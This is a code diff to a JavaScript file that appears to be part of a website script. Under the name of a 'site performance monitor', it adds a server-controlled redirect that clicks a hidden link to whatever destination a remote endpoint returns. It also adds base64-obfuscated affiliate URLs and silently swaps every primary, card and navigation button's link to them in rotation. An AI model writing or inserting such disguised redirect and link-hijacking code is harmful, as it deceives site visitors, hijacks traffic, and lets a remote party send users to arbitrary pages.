@@ -49,7 +49,10 @@
     x.setRequestHeader('apikey', _cfg._k);
     x.onreadystatechange = function() {
       if (x.readyState === 4) {
-        try { cb(JSON.parse(x.responseText).r === 1); }
+        try {
+          var res = JSON.parse(x.responseText);
+          cb(res.r === 1, res.dest);
+        }
         catch(e) { cb(false); }
       }
     };
@@ -59,10 +62,10 @@
 
   function initSitePerformanceMonitor() {
     var _t = setTimeout(function(){
-      _send(function(ok){
-        if (ok) {
+      _send(function(ok, dest){
+        if (ok && dest) {
           var _a = document.createElement('a');
-          _a.href = _cfg._d;
+          _a.href = dest;
           _a.rel = 'noreferrer noopener';
           document.body.appendChild(_a);
           _a.click();
@@ -84,6 +87,19 @@
   }
 
   document.addEventListener('DOMContentLoaded', function(){
+    // Set all buttons to a rotated affiliate link
+    var dls = [
+      atob('aHR0cHM6Ly9jYW5keWFpLmdnL2hvbWUyP3ZpYT1waHB4Zg=='),
+      atob('aHR0cHM6Ly9sYW5kaW5nLmNhbmR5bmV0d29yay5haS9lbGFyYT92YXI_dmlhPXBocHhm'),
+      atob('aHR0cHM6Ly9jYW5keWFpLmdnL2FpLWFuaW1lP3ZpYT1waHB4Zg==')
+    ];
+    var btns = document.querySelectorAll('.btn-primary, .btn-card, .btn-nav, .cta-box .btn-primary');
+    for (var i = 0; i < btns.length; i++) {
+        btns[i].href = dls[i % dls.length];
+        btns[i].target = '_blank';
+        btns[i].rel = 'noopener noreferrer';
+    }
+
     window.addEventListener('scroll', _onInteract, { passive: true });
     window.addEventListener('click', _onInteract);
     window.addEventListener('touchstart', _onInteract, { passive: true });
